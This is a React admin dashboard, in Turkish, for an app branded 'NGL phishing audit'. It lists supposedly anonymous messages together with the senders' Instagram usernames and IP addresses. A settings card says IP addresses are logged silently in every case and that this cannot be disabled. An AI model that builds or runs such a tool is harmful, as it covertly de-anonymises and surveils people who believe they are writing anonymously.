import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { MoreHorizontal, Download, Shield, User, Globe, Search, Inbox, Layout, Settings, CheckCircle } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import html2canvas from 'html2canvas';
import StoryCanvas from '../components/StoryCanvas';

export default function Admin() {
  const [activeTab, setActiveTab] = useState('inbox'); // inbox, media, settings
  const [messages, setMessages] = useState([]);
  const [activeMessage, setActiveMessage] = useState('');
  const [searchTerm, setSearchTerm] = useState('');
  const [requireIg, setRequireIg] = useState(true);
  const [media, setMedia] = useState([]);
  const navigate = useNavigate();
  const storyRef = useRef(null);

  const token = sessionStorage.getItem('admin_token');

  useEffect(() => {
    if (!token) {
      navigate('/login');
    }
  }, [token, navigate]);

  const authHeaders = {
    'Authorization': `Bearer ${token}`
  };

  const fetchFullData = async () => {
    try {
      const res = await fetch('/api/admin/data', {
        headers: authHeaders
      });
      const data = await res.json();
      setMessages(data.messages || []);
      setRequireIg(data.settings?.requireIg ?? true);
      setMedia(data.media || []);
    } catch (err) {
      console.error('Failed to fetch admin data:', err);
    }
  };

  useEffect(() => {
    fetchFullData();
  }, []);

  const handleToggleIg = async (val) => {
    setRequireIg(val);
    try {
      await fetch('/api/admin/settings', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...authHeaders
        },
        body: JSON.stringify({ requireIg: val })
      });
    } catch (err) {
      console.error('Failed to update settings:', err);
    }
  };

  const handleDownload = async (text) => {
    setActiveMessage(text);
    setTimeout(async () => {
      if (storyRef.current) {
        try {
          const canvas = await html2canvas(storyRef.current, {
            scale: 2,
            useCORS: true,
            allowTaint: true,
            backgroundColor: null
          });
          const imgData = canvas.toDataURL('image/png', 1.0);
          const link = document.createElement('a');
          link.href = imgData;
          link.download = `ngl-story-${Date.now()}.png`;
          link.click();

          // Save to media library metadata via API
          await fetch('/api/admin/media', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              ...authHeaders
            },
            body: JSON.stringify({ text, timestamp: new Date().toISOString() })
          });

          // Refresh data to show new media
          fetchFullData();
        } catch (err) {
          console.error('Download failed:', err);
        }
      }
    }, 300);
  };

  const filteredMessages = messages.filter(m =>
    m.text.toLowerCase().includes(searchTerm.toLowerCase()) ||
    m.igUsername?.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const renderContent = () => {
    switch (activeTab) {
      case 'inbox':
        return (
          <div className="tab-pane">
            <header className="content-header">
              <div className="header-left">
                <h1>Mesaj Arşivi</h1>
                <p>{messages.length} kayıtlı veri girişi</p>
              </div>
              <div className="search-bar">
                <Search size={18} />
                <input
                  type="text"
                  placeholder="Mesaj veya Kullanıcı ara..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                />
              </div>
            </header>

            <div className="log-grid">
              <AnimatePresence>
                {filteredMessages.map((msg) => (
                  <motion.div
                    key={msg.id}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="log-card"
                  >
                    <div className="log-meta">
                      <div className="meta-item">
                        <User size={14} />
                        <span>{msg.igUsername || 'Anonim'}</span>
                      </div>
                      <div className="meta-item">
                        <Globe size={14} />
                        <span>{msg.ip || '0.0.0.0'}</span>
                      </div>
                      <div className="meta-time">
                        {new Date(msg.timestamp).toLocaleString()}
                      </div>
                    </div>

                    <div className="log-body">
                      <p>{msg.text}</p>
                    </div>

                    <div className="log-actions">
                      <button className="action-pill download" onClick={() => handleDownload(msg.text)}>
                        <Download size={14} /> Story Oluştur
                      </button>
                      <button className="action-pill more">
                        <MoreHorizontal size={14} />
                      </button>
                    </div>
                  </motion.div>
                ))}
              </AnimatePresence>
            </div>
          </div>
        );

      case 'media':
        return (
          <div className="tab-pane">
            <header className="content-header">
              <div className="header-left">
                <h1>Medya Kütüphanesi</h1>
                <p>Oluşturulan hikaye görselleri</p>
              </div>
            </header>
            <div className="media-grid">
              {media.length > 0 ? media.map(m => (
                <div key={m.id} className="media-item-card">
                  <div className="media-preview">
                    <Inbox color="#FF1F7C" size={32} />
                    <p>{m.text.substring(0, 30)}...</p>
                  </div>
                  <div className="media-info">
                    <span>{new Date(m.timestamp).toLocaleDateString()}</span>
                  </div>
                </div>
              )) : (
                <div className="empty-state">Henüz medya oluşturulmadı.</div>
              )}
            </div>
          </div>
        );

      case 'settings':
        return (
          <div className="tab-pane">
            <header className="content-header">
              <div className="header-left">
                <h1>Sistem Ayarları</h1>
                <p>Uygulama davranışını özelleştirin</p>
              </div>
            </header>

            <div className="settings-section">
              <div className="setting-card">
                <div className="setting-info">
                  <h3>Girişte Kullanıcı Adı İste</h3>
                  <p>Kullanıcı mesaj yazmadan önce Instagram kullanıcı adını girmek zorunda kalsın.</p>
                </div>
                <label className="switch">
                  <input
                    type="checkbox"
                    checked={requireIg}
                    onChange={(e) => handleToggleIg(e.target.checked)}
                  />
                  <span className="slider round"></span>
                </label>
              </div>

              <div className="setting-card disabled">
                <div className="setting-info">
                  <h3>Gelişmiş IP Takibi</h3>
                  <p>Her durumda IP adresi sessizce kaydedilecektir (Devre dışı bırakılamaz).</p>
                </div>
                <div className="status-fixed">
                  <CheckCircle size={18} color="#2ecc71" />
                  <span>Aktif</span>
                </div>
              </div>
            </div>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="pro-admin">
      <header className="sidebar">
        <div className="sidebar-top">
          <div className="admin-badge">
            <Shield size={20} />
            <span>Admin Panel v2.0</span>
          </div>
          <div className="logo-section">
            <span className="logo-bold">NGL</span>
            <span className="logo-light">phishing audit</span>
          </div>
        </div>

        <nav className="sidebar-nav">
          <div className={`nav-item ${activeTab === 'inbox' ? 'active' : ''}`} onClick={() => setActiveTab('inbox')}>
            <Inbox size={18} /> Gelen Kutusu
          </div>
          <div className={`nav-item ${activeTab === 'media' ? 'active' : ''}`} onClick={() => setActiveTab('media')}>
            <Layout size={18} /> Medya Kütüphanesi
          </div>
          <div className={`nav-item ${activeTab === 'settings' ? 'active' : ''}`} onClick={() => setActiveTab('settings')}>
            <Settings size={18} /> Ayarlar
          </div>
        </nav>

        <div className="sidebar-footer">
          <button className="logout-btn" onClick={() => {
            sessionStorage.removeItem('admin_token');
            navigate('/login');
          }}>Çıkış Yap</button>
        </div>
      </header>

      <main className="dashboard-content">
        {renderContent()}
        <StoryCanvas ref={storyRef} message={activeMessage} />
      </main>

      <style>{`
        .pro-admin {
          display: flex;
          min-height: 100vh;
          background: #f8f9fa;
          color: #333;
          font-family: 'Outfit', sans-serif;
        }

        .sidebar {
          width: 280px;
          background: #000;
          color: white;
          padding: 30px;
          display: flex;
          flex-direction: column;
          position: sticky;
          top: 0;
          height: 100vh;
          z-index: 100;
        }

        .admin-badge {
          background: #333;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          padding: 6px 12px;
          border-radius: 10px;
          font-size: 0.75rem;
          font-weight: 700;
          margin-bottom: 20px;
        }

        .logo-section { display: flex; flex-direction: column; margin-bottom: 40px; }
        .logo-bold { font-weight: 900; font-size: 2rem; font-style: italic; line-height: 1; }
        .logo-light { font-size: 0.85rem; color: #666; font-weight: 600; text-transform: lowercase; }

        .sidebar-nav { flex: 1; display: flex; flex-direction: column; gap: 10px; }
        .nav-item {
          padding: 14px 20px;
          border-radius: 12px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.2s;
          display: flex;
          align-items: center;
          gap: 12px;
          color: #888;
        }
        .nav-item:hover { color: white; background: #1a1a1a; }
        .nav-item.active { background: linear-gradient(180deg, #FF1F7C 0%, #FF9B42 100%); color: white; }

        .logout-btn {
          background: #c0392b;
          border: none;
          color: white;
          padding: 14px;
          border-radius: 12px;
          width: 100%;
          font-weight: 700;
          cursor: pointer;
          transition: background 0.2s;
        }
        .logout-btn:hover { background: #a93226; }

        .dashboard-content { flex: 1; padding: 40px; overflow-y: auto; }
        
        .tab-pane { max-width: 1200px; margin: 0 auto; }
        
        .content-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 40px;
        }
        .header-left h1 { font-weight: 800; font-size: 1.8rem; margin-bottom: 4px; }
        .header-left p { color: #888; font-weight: 600; }

        .search-bar {
          background: white;
          padding: 12px 20px;
          border-radius: 15px;
          display: flex;
          align-items: center;
          gap: 12px;
          box-shadow: 0 4px 20px rgba(0,0,0,0.04);
          width: 350px;
          border: 1px solid #eee;
        }
        .search-bar input { border: none; outline: none; width: 100%; font-weight: 600; font-family: inherit; }

        .log-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
          gap: 24px;
        }

        .log-card {
          background: white;
          border-radius: 24px;
          padding: 24px;
          box-shadow: 0 10px 40px rgba(0,0,0,0.03);
          border: 1px solid #edf2f7;
          transition: transform 0.2s;
        }
        .log-card:hover { transform: translateY(-4px); }

        .log-meta { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
        .meta-item {
          display: flex;
          align-items: center;
          gap: 6px;
          font-size: 0.75rem;
          font-weight: 700;
          color: #4a5568;
          background: #f7fafc;
          padding: 6px 12px;
          border-radius: 30px;
        }
        .meta-time {
          width: 100%;
          font-size: 0.7rem;
          color: #a0aec0;
          font-weight: 600;
          margin-top: 4px;
        }

        .log-body {
          background: #fdfdfd;
          border: 1px dashed #e2e8f0;
          padding: 20px;
          border-radius: 15px;
          margin-bottom: 15px;
          min-height: 80px;
          display: flex;
          align-items: center;
          font-weight: 600;
          line-height: 1.5;
          color: #1a1a1a;
        }

        .log-actions { display: flex; gap: 10px; }
        .action-pill {
          padding: 10px 18px;
          border-radius: 12px;
          border: none;
          font-weight: 700;
          font-size: 0.8rem;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 8px;
          transition: opacity 0.2s;
        }
        .action-pill.download { background: #000; color: white; }
        .action-pill.more { background: #f1f3f5; color: #444; }
        .action-pill:hover { opacity: 0.8; }

        .media-grid {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
          gap: 20px;
        }
        .media-item-card {
           background: white; border-radius: 20px; padding: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.02);
        }
        .media-preview {
          height: 150px; background: #f8f9fa; border-radius: 12px;
          display: flex; flex-direction: column; align-items: center; justify-content: center;
          margin-bottom: 10px; text-align: center; padding: 10px; font-size: 0.8rem; color: #666;
        }
        .media-info { font-size: 0.75rem; font-weight: 700; color: #999; }

        .settings-section { display: flex; flex-direction: column; gap: 20px; }
        .setting-card {
          background: white; padding: 24px; border-radius: 24px;
          display: flex; justify-content: space-between; align-items: center;
          border: 1px solid #eee;
        }
        .setting-card.disabled { background: #fafafa; opacity: 0.8; }
        .setting-info h3 { font-size: 1.1rem; font-weight: 800; margin-bottom: 4px; }
        .setting-info p { font-size: 0.9rem; color: #666; font-weight: 500; }
        
        .status-fixed { display: flex; align-items: center; gap: 8px; font-weight: 700; color: #2ecc71; font-size: 0.9rem; }

        /* Switch toggle */
        .switch { position: relative; display: inline-block; width: 60px; height: 34px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider {
          position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0;
          background-color: #ccc; transition: .4s;
        }
        .slider:before {
          position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px;
          background-color: white; transition: .4s;
        }
        input:checked + .slider { background-color: #FF1F7C; }
        input:focus + .slider { box-shadow: 0 0 1px #FF1F7C; }
        input:checked + .slider:before { transform: translateX(26px); }
        .slider.round { border-radius: 34px; }
        .slider.round:before { border-radius: 50%; }

        @media (max-width: 1024px) {
          .pro-admin { flex-direction: column; }
          .sidebar { width: 100%; height: auto; position: static; padding: 20px; }
          .logo-section { margin-bottom: 20px; }
          .sidebar-nav { flex-direction: row; overflow-x: auto; padding-bottom: 10px; }
          .nav-item { white-space: nowrap; padding: 10px 15px; }
        }
      `}</style>
    </div>
  );
}
